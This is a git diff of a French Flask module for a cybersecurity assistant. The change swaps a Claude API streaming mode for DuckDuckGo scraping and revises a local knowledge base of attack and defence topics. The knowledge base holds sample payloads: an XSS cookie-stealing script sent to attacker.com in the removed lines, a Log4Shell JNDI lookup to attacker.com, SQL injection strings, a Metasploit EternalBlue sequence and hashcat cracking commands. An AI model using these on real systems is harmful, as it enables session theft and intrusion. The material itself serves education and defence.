@@ -1,112 +1,168 @@
 """
-PySecOps — Assistant Cybersécurité IA
-Branché sur Claude si clé disponible, sinon base locale.
+PySecOps — Assistant Cybersécurité
+Recherche sur DuckDuckGo + base de connaissances locale.
 """
-from flask import Blueprint, render_template, request, jsonify, Response, stream_with_context
+from flask import Blueprint, render_template, request, jsonify
 from app.utils.db_utils import enregistrer
-import os
-import json
+import requests
 import re
+import urllib.parse
 
 assistant_bp = Blueprint('assistant', __name__)
 
-SYSTEM_PROMPT = """Tu es un expert en cybersécurité offensive et défensive.
-Tu travailles pour PySecOps, une plateforme professionnelle de sécurité.
-Tu réponds en français, de manière précise, technique et concise.
-Tu couvres : pentest, OSINT, forensique, cryptographie, CVE, OWASP,
-malware, réseau, cloud security, DevSecOps.
-Pour chaque réponse tu donnes : explication claire, exemples concrets,
-commandes/outils si pertinent, et recommandations de sécurité."""
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+}
 
-# ── Base de connaissances locale (fallback sans clé API)
 CONNAISSANCES = {
     r"xss|cross.site.script": {
         "titre": "XSS — Cross-Site Scripting",
-        "reponse": "Le XSS injecte du JavaScript malveillant dans une page web.\n\n**Types :**\n- Réfléchi : payload dans l'URL\n- Stocké : payload sauvegardé en base\n- DOM : manipulation du DOM côté client\n\n**Exemple de payload :**\n```\n<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n```\n\n**Protection :** échapper les entrées, CSP stricte, httpOnly sur les cookies.",
+        "reponse": "Injection de JavaScript malveillant dans une page web.\n\n**Types :**\n- Réfléchi : payload dans l'URL\n- Stocké : payload en base de données\n- DOM : manipulation côté client\n\n**Protection :**\n- Échapper les entrées (htmlspecialchars)\n- Content Security Policy (CSP)\n- Flag httpOnly sur les cookies",
         "categorie": "Attaque Web",
+        "lien": "https://owasp.org/www-community/attacks/xss/"
     },
-    r"sql.inject|sqli": {
+    r"sql.inject|sqli|injection sql": {
         "titre": "Injection SQL",
-        "reponse": "Insertion de code SQL dans les entrées pour manipuler la base de données.\n\n**Exemple :**\n```\n' OR 1=1 --\n' UNION SELECT username,password FROM users --\n```\n\n**Outils :** sqlmap, manual testing\n\n**Protection :** requêtes préparées (PDO, paramètres), ORM, validation des entrées.",
+        "reponse": "Insertion de code SQL malveillant pour manipuler la base de données.\n\n**Exemple :**\n```\nadmin OR 1=1 --\nUNION SELECT username,password FROM users --\n```\n\n**Protection :**\n- Requêtes préparées (PDO, PreparedStatement)\n- ORM (SQLAlchemy)\n- Validation des entrées",
         "categorie": "Attaque Web",
+        "lien": "https://owasp.org/www-community/attacks/SQL_Injection"
     },
     r"log4shell|log4j|cve-2021-44228": {
-        "titre": "Log4Shell — CVE-2021-44228",
-        "reponse": "Vulnérabilité critique dans Log4j2 (CVSS 10.0) permettant une RCE via JNDI lookup.\n\n**Payload :**\n```\n${jndi:ldap://attacker.com/exploit}\n```\n\n**Impact :** exécution de code à distance sans authentification\n\n**Correction :** mettre à jour Log4j2 vers 2.17.1+, désactiver les lookups JNDI.",
+        "titre": "Log4Shell — CVE-2021-44228 (CVSS 10.0)",
+        "reponse": "Vulnérabilité critique dans Log4j2 permettant une RCE via JNDI lookup.\n\n**Payload :**\n```\n${jndi:ldap://attacker.com:1389/exploit}\n```\n\n**Correction :**\n- Mettre à jour Log4j2 vers 2.17.1+\n- Désactiver JNDI lookups",
         "categorie": "CVE Critique",
+        "lien": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
     },
-    r"ransomware|rançon": {
-        "titre": "Ransomware",
-        "reponse": "Malware qui chiffre vos fichiers et réclame une rançon.\n\n**Vecteurs courants :**\n- Phishing (pièces jointes malveillantes)\n- RDP exposé avec mot de passe faible\n- Vulnérabilités non patchées (EternalBlue/SMB)\n\n**Protection :**\n- Règle 3-2-1 pour les sauvegardes\n- EDR sur tous les postes\n- Patch management régulier\n- Segmentation réseau",
-        "categorie": "Malware",
+    r"nmap|scanner.*port|port.*scan": {
+        "titre": "Nmap — Scanner réseau",
+        "reponse": "**Commandes essentielles :**\n\n```bash\nnmap -sV -sC 192.168.1.1\nnmap -p- --min-rate 5000 192.168.1.1\nnmap -sU --top-ports 100 192.168.1.1\nnmap -O 192.168.1.1\nnmap --script vuln 192.168.1.1\n```",
+        "categorie": "Outils",
+        "lien": "https://nmap.org/book/man.html"
     },
-    r"pentest|test.*intrusion|méthodologie": {
-        "titre": "Méthodologie de Pentest",
-        "reponse": "**Phases PTES :**\n\n1. **Reconnaissance** — OSINT passif (WHOIS, DNS, emails, subdomains)\n2. **Scanning** — ports, services, versions, OS fingerprinting\n3. **Analyse** — CVE lookup, test manuel des vulnérabilités\n4. **Exploitation** — PoC contrôlé, élévation de privilèges\n5. **Post-exploitation** — mouvement latéral, persistence\n6. **Rapport** — findings, CVSS, remédiation\n\n**Outils :** Nmap, Burp Suite, Metasploit, sqlmap, Gobuster",
-        "categorie": "Méthodologie",
+    r"metasploit|msf|msfconsole": {
+        "titre": "Metasploit Framework",
+        "reponse": "**Commandes de base :**\n\n```bash\nmsfconsole\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> set RHOSTS 192.168.1.100\nmsf> set LHOST 192.168.1.50\nmsf> exploit\n```",
+        "categorie": "Outils",
+        "lien": "https://docs.metasploit.com/"
+    },
+    r"burp|burp suite|proxy.*http": {
+        "titre": "Burp Suite — Proxy HTTP",
+        "reponse": "**Modules essentiels :**\n\n- Proxy : intercepte les requêtes HTTP\n- Repeater : rejoue et modifie les requêtes\n- Intruder : attaques automatisées\n- Scanner : détection auto de vulnérabilités\n- Decoder : encode/décode Base64, URL, Hex\n\n**Workflow :** Proxy → Intercept → Send to Repeater → Tester",
+        "categorie": "Outils",
+        "lien": "https://portswigger.net/burp/documentation"
     },
     r"osint|reconnaissance passive": {
         "titre": "OSINT — Open Source Intelligence",
-        "reponse": "Collecte d'informations depuis des sources publiques sans toucher la cible.\n\n**Sources :**\n- `crt.sh` — sous-domaines via certificats SSL\n- `Shodan` — services exposés sur internet\n- `Hunter.io` — emails professionnels\n- `theHarvester` — emails, sous-domaines\n- `Google Dorks` — fichiers sensibles indexés\n- `LinkedIn` — employés et technologies\n\n**Règle d'or :** ne jamais envoyer de requêtes directes à la cible en phase passive.",
+        "reponse": "**Sources gratuites :**\n\n```\ncrt.sh       → sous-domaines via certificats SSL\nShodan.io    → services exposés sur internet\nHunter.io    → emails professionnels\nSpiderFoot   → OSINT automatisé complet\nRecon-ng     → framework OSINT modulaire\n```\n\n**Règle :** zéro contact direct avec la cible en phase passive.",
         "categorie": "Reconnaissance",
+        "lien": "https://osintframework.com/"
     },
-    r"owasp|top 10": {
-        "titre": "OWASP Top 10 (2021)",
-        "reponse": "Les 10 risques les plus critiques des applications web :\n\n1. **A01** Broken Access Control\n2. **A02** Cryptographic Failures\n3. **A03** Injection (SQL, XSS, SSTI...)\n4. **A04** Insecure Design\n5. **A05** Security Misconfiguration\n6. **A06** Vulnerable Components\n7. **A07** Auth & Session Failures\n8. **A08** Integrity Failures\n9. **A09** Logging & Monitoring Failures\n10. **A10** SSRF\n\nSource : owasp.org/Top10",
+    r"owasp|top 10|top10": {
+        "titre": "OWASP Top 10 — 2021",
+        "reponse": "**Les 10 risques les plus critiques :**\n\n1. A01 — Broken Access Control\n2. A02 — Cryptographic Failures\n3. A03 — Injection (SQL, XSS, SSTI)\n4. A04 — Insecure Design\n5. A05 — Security Misconfiguration\n6. A06 — Vulnerable Components\n7. A07 — Auth Failures\n8. A08 — Integrity Failures\n9. A09 — Logging Failures\n10. A10 — SSRF\n\nSource : owasp.org/Top10",
         "categorie": "Standards",
+        "lien": "https://owasp.org/Top10/"
     },
-    r"sha256|sha-256|hachage|hash": {
-        "titre": "SHA-256 et fonctions de hachage",
-        "reponse": "Fonction mathématique irréversible produisant une empreinte de taille fixe.\n\n**Algorithmes par usage :**\n```\nMD5 (32 hex)    → intégrité basique SEULEMENT (cassé)\nSHA1 (40 hex)   → obsolète, vulnérable aux collisions\nSHA256 (64 hex) → standard actuel ✅\nSHA512 (128 hex)→ haute sécurité ✅\nbcrypt          → mots de passe ✅\nArgon2          → mots de passe (recommandé 2024) ✅\n```\n\n**Règle :** Ne JAMAIS utiliser MD5/SHA1 pour les mots de passe.",
-        "categorie": "Cryptographie",
-    },
-    r"aes|chiffrement symétrique": {
-        "titre": "AES — Chiffrement symétrique",
-        "reponse": "Standard de chiffrement le plus utilisé au monde.\n\n**Modes recommandés :**\n```\nAES-128-GCM  → usage courant ✅\nAES-256-GCM  → haute sécurité, gouvernemental ✅\nAES-CBC      → acceptable mais préférer GCM\nAES-ECB      → JAMAIS (patterns visibles) ❌\n```\n\n**En Python :**\n```python\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nkey = AESGCM.generate_key(bit_length=256)\naesgcm = AESGCM(key)\n```",
-        "categorie": "Cryptographie",
-    },
-    r"ssrf|server.side.request": {
-        "titre": "SSRF — Server-Side Request Forgery",
-        "reponse": "Force le serveur à effectuer des requêtes vers des ressources internes.\n\n**Exemple :**\n```\nhttps://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\n```\n\n**Impact :** accès aux métadonnées cloud (AWS/GCP/Azure), services internes, SSRF → RCE\n\n**Protection :** whitelist des URLs, bloquer les IPs privées, désactiver les redirections",
-        "categorie": "Attaque Web",
-    },
-    r"mfa|2fa|double authentification": {
-        "titre": "MFA — Authentification Multi-Facteurs",
-        "reponse": "Ajoute une couche de sécurité après le mot de passe.\n\n**Facteurs :**\n- Ce que vous savez : mot de passe\n- Ce que vous avez : TOTP (Google Auth, Authy), clé FIDO2/WebAuthn\n- Ce que vous êtes : biométrie\n\n**Recommandation 2024 :** FIDO2/WebAuthn > TOTP > SMS (SMS = vulnérable au SIM swapping)\n\n**Activez le MFA sur :** email, GitHub, cloud, banque, VPN.",
-        "categorie": "Authentification",
-    },
-    r"burp|burp suite": {
-        "titre": "Burp Suite — Proxy HTTP",
-        "reponse": "Outil incontournable du pentester web.\n\n**Modules clés :**\n- **Proxy** — intercepte et modifie les requêtes HTTP\n- **Repeater** — rejoue et modifie les requêtes\n- **Intruder** — attaques automatisées (brute-force, fuzzing)\n- **Scanner** — détection automatique de vulnérabilités (Pro)\n- **Decoder** — encode/décode Base64, URL, HTML...\n\n**Workflow :** Proxy → Intercept → Send to Repeater → Tester",
+    r"hashcat|cracker.*hash|hash.*crack": {
+        "titre": "Hashcat — Cracking de hashes",
+        "reponse": "**Commandes essentielles :**\n\n```bash\nhashcat -m 0 -a 0 hash.txt wordlist.txt\nhashcat -m 1000 -a 0 hash.txt wordlist.txt\nhashcat -m 3200 -a 0 hash.txt wordlist.txt\nhashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a\n```\n\n**Types :** MD5=0, SHA1=100, SHA256=1400, NTLM=1000, bcrypt=3200",
         "categorie": "Outils",
+        "lien": "https://hashcat.net/wiki/"
     },
-    r"nmap": {
-        "titre": "Nmap — Network Scanner",
-        "reponse": "Scanner réseau de référence.\n\n**Commandes essentielles :**\n```bash\nnmap -sV -sC target.com          # scan services + scripts\nnmap -p- --min-rate 5000 target  # scan tous les ports\nnmap -sU -top-ports 100 target   # scan UDP\nnmap -O target.com               # détection OS\nnmap --script vuln target        # scripts de vulnérabilités\n```\n\n**Formats de sortie :**\n```bash\nnmap -oN output.txt target  # texte\nnmap -oX output.xml target  # XML\n```",
-        "categorie": "Outils",
+    r"pentest|test.*intrusion|methodolog": {
+        "titre": "Méthodologie Pentest — PTES",
+        "reponse": "**7 phases PTES :**\n\n1. Pre-engagement — périmètre, autorisation\n2. Intelligence Gathering — OSINT passif\n3. Threat Modeling — actifs critiques\n4. Vulnerability Analysis — scanners + tests manuels\n5. Exploitation — PoC contrôlés\n6. Post-Exploitation — élévation, mouvement latéral\n7. Reporting — findings + CVSS + remédiation",
+        "categorie": "Méthodologie",
+        "lien": "http://www.pentest-standard.org/"
+    },
+    r"ransomware|rançon|chiffr.*fichier": {
+        "titre": "Ransomware — Analyse et protection",
+        "reponse": "**Comment ça fonctionne :**\n1. Infection (phishing, RDP exposé)\n2. Reconnaissance réseau\n3. Exfiltration des données\n4. Chiffrement AES-256 + RSA\n5. Demande de rançon\n\n**Protection :**\n- Sauvegardes 3-2-1\n- Patch management régulier\n- MFA sur tous les accès distants\n- EDR sur les postes\n- Segmentation réseau",
+        "categorie": "Malware",
+        "lien": "https://www.cisa.gov/stopransomware"
+    },
+    r"sha256|sha-256|hachage|hash.*type": {
+        "titre": "Fonctions de hachage cryptographique",
+        "reponse": "**Algorithmes par usage :**\n\n```\nMD5 (32 hex)     → obsolète, ne pas utiliser pour mots de passe\nSHA1 (40 hex)    → vulnérable aux collisions\nSHA256 (64 hex)  → standard actuel\nSHA512 (128 hex) → haute sécurité\nbcrypt           → mots de passe\nArgon2           → mots de passe (recommandé 2024)\n```",
+        "categorie": "Cryptographie",
+        "lien": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
     },
 }
 
 REPONSE_DEFAUT = {
-    "titre":    "Question reçue",
-    "reponse":  "Je suis votre assistant cybersécurité. Je peux vous aider sur :\n\n**Attaques web :** XSS, SQLi, SSRF, CSRF, LFI/RFI\n**Malware :** Ransomware, phishing, APT\n**Cryptographie :** AES, SHA256, bcrypt, hachage\n**Outils :** Nmap, Burp Suite, sqlmap, Metasploit\n**Standards :** OWASP Top 10, PTES, CVE/CVSS\n**Authentification :** MFA, JWT, sessions\n\nPosez une question précise pour une réponse technique détaillée.",
-    "categorie": "Aide",
+    "titre":    "Recherche en cours...",
+    "reponse":  "Je cherche des informations sur ce sujet.",
+    "categorie": "Recherche",
+    "lien":     "",
 }
 
 
-def repondre_local(question: str) -> dict:
+def rechercher_ddg(question: str) -> dict:
+    """Cherche sur DuckDuckGo HTML (gratuit, sans clé)."""
+    try:
+        query = "cybersécurité " + question
+        url   = "https://html.duckduckgo.com/html/?q=" + urllib.parse.quote(query)
+        r     = requests.get(url, headers=HEADERS, timeout=8)
+
+        snippets = re.findall(
+            r'class="result__snippet"[^>]*>(.*?)</a>',
+            r.text, re.DOTALL
+        )[:4]
+
+        liens_raw = re.findall(
+            r'class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>',
+            r.text, re.DOTALL
+        )[:4]
+
+        texte_propre = []
+        for s in snippets:
+            s = re.sub(r'<[^>]+>', '', s).strip()
+            if len(s) > 30:
+                texte_propre.append(s)
+
+        liens = []
+        for href, titre in liens_raw:
+            titre = re.sub(r'<[^>]+>', '', titre).strip()
+            if titre and href:
+                liens.append({"titre": titre[:60], "url": href})
+
+        if texte_propre:
+            reponse = "**Résultats de recherche pour : " + question + "**\n\n"
+            for i, snippet in enumerate(texte_propre[:3], 1):
+                reponse += str(i) + ". " + snippet + "\n\n"
+            if liens:
+                reponse += "\n**Sources :**\n"
+                for lien in liens[:3]:
+                    reponse += "- [" + lien["titre"] + "](" + lien["url"] + ")\n"
+            return {
+                "titre":    "Recherche : " + question,
+                "reponse":  reponse,
+                "categorie":"Recherche Web",
+                "lien":     liens[0]["url"] if liens else "",
+            }
+    except Exception:
+        pass
+
+    return {
+        "titre":    question,
+        "reponse":  "Recherche indisponible. Consultez directement :\n- [Google](https://www.google.com/search?q=cybersecurite+" + urllib.parse.quote(question) + ")\n- [OWASP](https://owasp.org)\n- [NVD NIST](https://nvd.nist.gov)",
+        "categorie":"Aide",
+        "lien":     "https://www.google.com/search?q=cybersecurite+" + urllib.parse.quote(question),
+    }
+
+
+def repondre(question: str) -> dict:
+    """Base locale d'abord, puis DuckDuckGo."""
     q = question.lower().strip()
-    for pattern, reponse in CONNAISSANCES.items():
+    for pattern, rep in CONNAISSANCES.items():
         if re.search(pattern, q, re.IGNORECASE):
-            return reponse
-    return REPONSE_DEFAUT
+            return rep
+    return rechercher_ddg(question)
 
 
 @assistant_bp.route('/assistant')
 def assistant():
-    api_key = os.environ.get("ANTHROPIC_API_KEY", "")
-    mode = "claude" if api_key else "local"
-    return render_template('assistant.html', active='assistant', mode=mode)
+    return render_template('assistant.html', active='assistant')
 
 
 @assistant_bp.route('/api/assistant', methods=['POST'])
@@ -114,40 +170,5 @@ def api_assistant():
     question = request.json.get('question', '').strip()
     if not question:
         return jsonify({"erreur": "Question vide."})
-
     enregistrer("assistant", question[:50])
-    api_key = os.environ.get("ANTHROPIC_API_KEY", "")
-
-    # ── Mode Claude API (streaming)
-    if api_key:
-        try:
-            import anthropic
-
-            def generer_claude():
-                client = anthropic.Anthropic(api_key=api_key)
-                with client.messages.stream(
-                    model="claude-opus-4-5",
-                    max_tokens=1024,
-                    system=SYSTEM_PROMPT,
-                    messages=[{"role": "user", "content": question}]
-                ) as stream:
-                    for text in stream.text_stream:
-                        yield f"data: {json.dumps({'text': text})}\n\n"
-                yield "data: [DONE]\n\n"
-
-            return Response(
-                stream_with_context(generer_claude()),
-                mimetype='text/event-stream',
-                headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'}
-            )
-        except Exception as e:
-            pass
-
-    # ── Mode local (fallback)
-    reponse = repondre_local(question)
-    return jsonify({
-        "titre":    reponse["titre"],
-        "reponse":  reponse["reponse"],
-        "categorie":reponse.get("categorie", ""),
-        "mode":     "local",
-    })
+    return jsonify(repondre(question))
